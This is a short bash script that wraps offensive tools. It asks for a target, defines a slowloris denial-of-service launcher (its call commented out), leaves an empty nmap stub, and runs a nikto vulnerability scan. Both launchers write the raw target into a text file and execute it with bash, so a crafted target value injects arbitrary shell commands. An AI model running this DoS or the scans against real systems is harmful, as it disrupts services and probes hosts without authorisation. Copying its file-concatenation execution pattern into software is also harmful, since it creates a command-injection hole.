#!/bin/bash


# Ask the user for the target
intro()
{
echo -n "What is your target?"
read target
echo "$target" > target.txt #use  >> if you would like to append instead of overwriting
}
intro
# scripts nmap - vulnerability assessment
nmap()
{
    echo -n "Would you like to run a basic vulnerability assessment?(y/n)"
    read response
    if [[ $response == "Y" || $response == "y" ]]; then
        echo "We will do something here, but a little later, stay tuned for updates!"
    else
        echo "We will not run any of scripts as you said"
    fi
}
#nmap
#dos - slowloris
slowloris()
{
    echo -n "Would you like to perform DoS?(y/n)"
    read dos
    if [[ $dos == "Y" || $dos == "y" ]]; then
        cd tools/slowloris.pl
        touch attack.txt
        echo -n "perl slowloris.pl -dns " > attack.txt
        cd ../..
        echo -n "$target" >> tools/slowloris.pl/attack.txt
        cd tools/slowloris.pl/
        bash attack.txt
    else
        echo "We will not run any of scripts as you said"
    fi
}
#slowloris
#nikto - overall basic scan [vulnerability assessment]
nikto()
{
    echo -n "Would you like to perform a vulnerability assessment?(y/n)?"
    read nikto
    if [[ $nikto == "Y" || $nikto == "y" ]]; then
        cd tools/nikto
        touch attack_nikto.txt
        echo "DEBUG _ _ _ "
        pwd
        echo "DEBUG - - - "
        echo -n "nikto -Display 1234EP -o report_nikto.html -Format htm -Tuning 58 -host " > attack_nikto.txt
        cd ../..
        echo "WE ARE BACK" && pwd
        echo -n "$target" >> tools/nikto/attack_nikto.txt
        cd tools/nikto
        bash attack_nikto.txt
        # move report_nikto.html to /results
        mv report_nikto.html ../..
        cd ../..
        mv report_nikto.html results/
    else
        echo "We will not run any of scripts as you said"
    fi
}
nikto
